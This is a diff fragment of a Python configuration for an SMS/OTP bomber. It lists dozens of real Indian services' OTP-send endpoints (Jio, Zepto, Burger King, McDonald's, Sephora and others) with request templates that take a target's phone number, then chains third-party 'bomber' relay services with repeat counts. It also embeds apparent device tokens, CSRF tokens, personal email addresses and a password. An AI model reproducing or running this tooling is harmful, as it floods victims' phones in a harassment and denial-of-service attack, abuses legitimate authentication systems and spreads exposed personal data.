+        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "BetterHalf",
+        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
+    },
+    {
+        "name": "Charzer",
+        "url": "https://api.charzer.com/auth-service/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
+    },
+    {
+        "name": "Nuvama Wealth",
+        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
+    },
+    {
+        "name": "Mpokket",
+        "url": "https://web-api.mpokket.in/registration/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}"}}'
+    },
+    
+    {
+        "name": "Frizza.in API",
+        "url": "https://api.frizza.in/api/v1/onboard",
+        "method": "POST",
+        "headers": {
+            "Host": "api.frizza.in",
+            "accept": "application/json",
+            "device-id": "39f6b199b67824af",
+            "signature": "e8bee9c8cfde6e58abb0318ad6276d1a2223e93ce0a752e2762c6fc7eeca22fa7b0118254f3c90cf8d71493785d65c053aa796c5f0b5e9784bd09e25b8ea2705",
+            "app-version": "209",
+            "source": "playstore",
+            "x-language": "ENG",
+            "content-type": "application/json; charset=UTF-8",
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/4.10.0"
+        },
+        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"39f6b199b67824af","app_version":"209","medium":"manual","manufacturer":"OPPO","device_model":"CPH2665","rooted":false,"campaign":"utm_source=google-play&utm_medium=organic","carrier":"Vi India","gaid":"4138faad-9b36-42d2-99b9-def50162d119","fcm_token":"f73495ZfR-y2YMgGVgb7tl:APA91bF1KE0KqiE5t2m_WtLlupunctdIh2M_SMJwBwVmknbC01apf5wlN9gpPcE9OC9UFDIQEhUn56fTzXZZVAlTWDDA6Xv3CBy6lar3ufRoa2-evKXRu0U","version":"v2","appsflyer_id":"1766720674680-3477420891340560610"}}'
+    },
+    {
+        "name": "KhelGuru SMS",
+        "url": "https://khelguru.co.in/api/v1/send-otp",
+        "method": "POST",
+        "headers": {
+            "Host": "khelguru.co.in",
+            "sec-ch-ua-platform": '"Android"',
+            "x-csrf-token": "HfNMhWg8cdAwcNIbWO2Q6UIr1ydpFnXnrIMXnIDS",
+            "cache-control": "no-cache",
+            "sec-ch-ua": '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "x-requested-with": "XMLHttpRequest",
+            "user-agent": "Mozilla/5.0 (Linux; Android 15; CPH2665 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36",
+            "accept": "*/*",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "origin": "https://khelguru.co.in",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://khelguru.co.in/",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+            "priority": "u=1, i"
+        },
+        "data": lambda phone: f"phoneNumber=%2B91{phone}"
+    },
+    {
+        "name": "KickCash.in API",
+        "url": "https://app-api.kickcash.in/api/v1/onboard",
+        "method": "POST",
+        "headers": {
+            "Host": "app-api.kickcash.in",
+            "accept": "application/json",
+            "cache-control": "no-cache",
+            "device-id": "5586bb20f5518edc",
+            "signature": "396441c1a13cc9ccaeb0433ce432b08b70c96d58aebc2c95e2b5f2ed8ed6faa7",
+            "content-type": "application/json",
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/4.12.0"
+        },
+        "data": lambda phone: f'{{"device_id":"5586bb20f5518edc","app_version":"17.8","carrier":"Vi India","campaign":null,"manufacturer":"OPPO","device_model":"CPH2665","rooted":false,"gaid":"4138faad-9b36-48b2-99b9-def50162d119","fcm_token":"f_ZdFlXiSHufPT86aU0mCR:APA91bEIiyJcYZut2P6-6-SjzaymIoKElDVVGK8zQxRjJNp_I2Z3p3fSWQ6I_UKRQ6v7Fke5ikqBGBnu4z6OZmo5zSnQmI_s7DH_SOnFt5I7BHHs87pZwqc","app_source":"ANDROID","medium":"MANUAL","appsflyer_id":"1765532683821-1975949734192293308","mobile":"{phone}","phone_code":"+91"}}'
+    },
+    {
+        "name": "Rojgarkaro.in API",
+        "url": "https://rojgarkaro.in/api/auth/sendOTPOnSignup",
+        "method": "POST",
+        "headers": {
+            "Host": "rojgarkaro.in",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-ch-ua": '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 15; CPH2665 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36",
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "origin": "https://rojgarkaro.in",
+            "x-requested-with": "via.bolte",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://rojgarkaro.in/signup",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
+            "priority": "u=1, i"
+        },
+        "data": lambda phone: f'{{"mobile_no":"{phone}","email_id":"Surajbinod@gmail.com","isSessionActive":false}}'
+    },
+    
+    {
+        "name": "AdView.in OTP",
+        "url": "https://adview.in/api/auth/send-otp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","signupPayload":{{"username":"Krishna7824","email":"bundodn@gmail.com","password":"Kro@1234","confirmPassword":"Kro@1234","referralCode":"V7XJLX"}}}}'
+    },
+    {
+        "name": "Burger King Signup",
+        "url": "https://burgerking.in/api/consumer/api/v1/user/signUpWithPhone",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone_no":{phone}}}'
+    },
+    {
+        "name": "Factori Login",
+        "url": "https://factori.com/login/check_user_exists",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"mobNumber={phone}&countryCode=91"
+    },
+    {
+        "name": "HamaraMall OTP",
+        "url": "https://hamaramall.com/api/__api_party/apiServer",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"path":"/auth/otp","headers":[],"method":"post","body":{{"partner":"mall4all","name":"Krishna","phone":"{phone}"}}}}'
+    },
+    {
+        "name": "Havells OTP",
+        "url": "https://havells.com/otplogin/account/otploginpost/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on"
+    },
+    {
+        "name": "Jio Login",
+        "url": "https://www.jio.com/api/jio-login-service/login/sendOtp",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}}'
+    },
+    {
+        "name": "KukuFM OTP",
+        "url": "https://kukufm.com/api/v1/users/auth/send-otp/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"phone_number":" 91{phone}","recaptcha_token":""}}'
+    },
+    {
+        "name": "McDonald's OTP",
+        "url": lambda phone: f"https://be.mcdelivery.co.in/auth/otp/{phone}/",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Otpless Auth",
+        "url": "https://user-auth.otpless.app/v3/lp/user/transaction/intent/627b4eda-fbea-44fe-8a48-dcae67d166c0",
+        "method": "POST",
+        "headers": {"Content-Type": "text/plain;charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"metadata":"{{\\"browser\\":\\"Chrome\\"}}","loginUri":"https://www.niviasports.com/cart","origin":"https://www.niviasports.com","version":"V4.1","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 15; CPH2665 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.146 Mobile Safari/537.36\\",\\"platform\\":\\"Linux aarch64\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-GB\\",\\"cookieEnabled\\":true,\\"screenWidth\\":424,\\"screenHeight\\":944,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":1.7000000476837158,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"sans-serif\\",\\"cHash\\":\\"dfcf9b16285f0455311d3f9a3e291825d92d40c17e7b7e317bec389ced232665\\"}}","browser":"Chrome","sdkPlatform":null,"platform":"Android","isLoginPage":false,"channel":"OTP","type":"INPUT","mobile":"91{phone}","selectedCountryCode":" 91","value":"{phone}","triggerWebauthn":false,"silentAuthEnabled":false,"clientMetaData":"{{\\"sellerDisplayName\\":\\"niviasports\\",\\"sellerDomain\\":\\"niviasports.com\\"}}","otpLength":4,"tsId":"218BA338-74D2A5B9-4000-8-1FC96006-00006B16BC6D","inId":"52110615-F6B25E98-4000-8-86034AB0-000037048EE4-019B97887157","appId":"6YH1ZI6T4Q7SHRDVDEK7"}}'
+    },
+    {
+        "name": "Sephora OTP",
+        "url": "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobile":"{phone}","country_code":"91"}}'
+    },
+    {
+        "name": "ShareChat OTP",
+        "url": "https://apis.sharechat.com/event-tracking-service/v1.0.0/sendPWAEvents",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"client":"web","message":[{{"app_version":4911,"user_agent":"Mozilla/5.0 (Linux; Android 15; CPH2665 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.146 Mobile Safari/537.36","browser":"Chrome 143","browser_name":"Chrome","client":"SharechatPWA2.0","incognito":false,"installed":false,"ip":"::ffff:35.191.133.131","os_name":"android","temp_user_id":null,"user_id":"4804102570","uuid":"3c34bcd3-0560-4c13-8233-e2e5157bbccc","time":1767855390091,"url":"/signin","eventName":"SIGN_IN","action":"submitPhone"}},{{"app_version":4911,"user_agent":"Mozilla/5.0 (Linux; Android 15; CPH2665 Build/AP3A.240617.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.146 Mobile Safari/537.36","browser":"Chrome 143","browser_name":"Chrome","client":"SharechatPWA2.0","incognito":false,"installed":false,"ip":"::ffff:35.191.133.131","os_name":"android","temp_user_id":null,"user_id":"4804102570","uuid":"841171ec-f8de-4bb4-9aa6-bec97a13519f","time":1767855392446,"url":"/signin","eventName":"SIGN_IN","action":"otpPrompt"}}]}}'
+    },
+    {
+        "name": "Skinn.in OTP",
+        "url": "https://www.skinn.in/on/demandware.store/Sites-Skinn-Site/en_IN/OtpVerification-SendOTP",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f"dwfrm_profile_countryCode=+91&dwfrm_profile_phone={phone}&csrf_token=cg9BmkfpcV2dY5KPb52Mh4xgZuzNORos7oOlDUBE17l9x_QIxb5brWCrpcpXR5HhcH1LTSY6iiwi-U-A76SLp1tN9G9knPQrvNMLTIOHn4Ja2ETek-6Up9mKx6qsDbD9eYFe8IoHFSOk2ngmWARUzQuxYOJ-HcsrsjiZqgt3KBOGWKAnQ7I="
+    },
+    {
+        "name": "Cognito AWS (BuyWow)",
+        "url": "https://cognito-idp.ap-south-1.amazonaws.com/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/x-amz-json-1.1", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"Username":"+91{phone}","ClientId":"hs1ikh5ki8k7jptmaoi9puf4n"}}'
+    },
+    {
+        "name": "Zepto OTP",
+        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
+        "method": "POST",
+        "headers": {"Content-Type": "application/json; charset=UTF-8", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
+    },
+    # NEW EARNINGPD APIs ADDED HERE
+    {
+        "name": "EarningPD API 1",
+        "url": lambda phone: f"https://earningpd.xyz/All/1.php?num={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "EarningPD API 2",
+        "url": lambda phone: f"https://earningpd.xyz/All/2.php?num={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "EarningPD API 3",
+        "url": lambda phone: f"https://earningpd.xyz/All/3.php?num={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "EarningPD API 4",
+        "url": lambda phone: f"https://earningpd.xyz/All/4.php?num={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "EarningPD API 5",
+        "url": lambda phone: f"https://earningpd.xyz/All/5.php?num={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    # Boomberxnexu APIs (5 times)
+    {
+        "name": "Boomberxnexu API 1",
+        "url": lambda phone: f"https://boomberxnexu.vercel.app/api?number={phone}&country=91&count=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Boomberxnexu API 2",
+        "url": lambda phone: f"https://boomberxnexu.vercel.app/api?number={phone}&country=91&count=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Boomberxnexu API 3",
+        "url": lambda phone: f"https://boomberxnexu.vercel.app/api?number={phone}&country=91&count=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    
+    # Hardboomber APIs
+    {
+        "name": "Hardboomber API 1",
+        "url": lambda phone: f"https://hardboomber.allapifree.workers.dev/?mobile={phone}&repeat=1",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Hardboomber API 2",
+        "url": lambda phone: f"https://hardboomber.allapifree.workers.dev/?mobile={phone}&repeat=2",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Hardboomber API 3",
+        "url": lambda phone: f"https://hardboomber.allapifree.workers.dev/?mobile={phone}&repeat=3",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    
+    # Thakur APIs (4 times)
+    {
+        "name": "Thakur API 1",
+        "url": lambda phone: f"https://earningpd-pdloot.kro7836k.workers.dev/?sms={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Thakur API 2",
+        "url": lambda phone: f"https://earningpd-pdloot.kro7836k.workers.dev/?sms={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Thakur API 3",
+        "url": lambda phone: f"https://earningpd-pdloot.kro7836k.workers.dev/?sms={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "Thakur API 4",
+        "url": lambda phone: f"https://earningpd-pdloot.kro7836k.workers.dev/?sms={phone}",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    
+    # EarningPD APIs (1 to 20, skipping 18)
+    {"name": "EarningPD API 1", "url": lambda phone: f"https://earningpd.xyz/All/1.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 2", "url": lambda phone: f"https://earningpd.xyz/All/2.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 3", "url": lambda phone: f"https://earningpd.xyz/All/3.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 4", "url": lambda phone: f"https://earningpd.xyz/All/4.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 5", "url": lambda phone: f"https://earningpd.xyz/All/5.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 6", "url": lambda phone: f"https://earningpd.xyz/All/6.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 7", "url": lambda phone: f"https://earningpd.xyz/All/7.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 8", "url": lambda phone: f"https://earningpd.xyz/All/8.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 9", "url": lambda phone: f"https://earningpd.xyz/All/9.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 10", "url": lambda phone: f"https://earningpd.xyz/All/10.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 11", "url": lambda phone: f"https://earningpd.xyz/All/11.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 12", "url": lambda phone: f"https://earningpd.xyz/All/12.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 13", "url": lambda phone: f"https://earningpd.xyz/All/13.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 14", "url": lambda phone: f"https://earningpd.xyz/All/14.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 15", "url": lambda phone: f"https://earningpd.xyz/All/15.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 16", "url": lambda phone: f"https://earningpd.xyz/All/16.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 17", "url": lambda phone: f"https://earningpd.xyz/All/17.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 19", "url": lambda phone: f"https://earningpd.xyz/All/19.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    {"name": "EarningPD API 20", "url": lambda phone: f"https://earningpd.xyz/All/20.php?num={phone}", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, "data": None},
+    
+    # PD Phone Bomber APIs
+    {
+        "name": "PD Phone Bomber 1",
+        "url": lambda phone: f"https://pd-phone-bomber2.thakur-infopd.workers.dev/?mobile={phone}&repeat=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "PD Phone Bomber 2",
+        "url": lambda phone: f"https://pd-phone-bomber.kro7836k.workers.dev/?mobile={phone}&repeat=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "PD Phone Bomber 3",
+        "url": lambda phone: f"https://pd-phone-bomber.thakur-infopd.workers.dev/?mobile={phone}&repeat=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+    {
+        "name": "PD Phone Bomber 4",
+        "url": lambda phone: f"https://pd-phone-bomber1.thakur-infopd.workers.dev/?mobile={phone}&repeat=5",
+        "method": "GET",
+        "headers": {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"},
+        "data": None
+    },
+  ]
+}
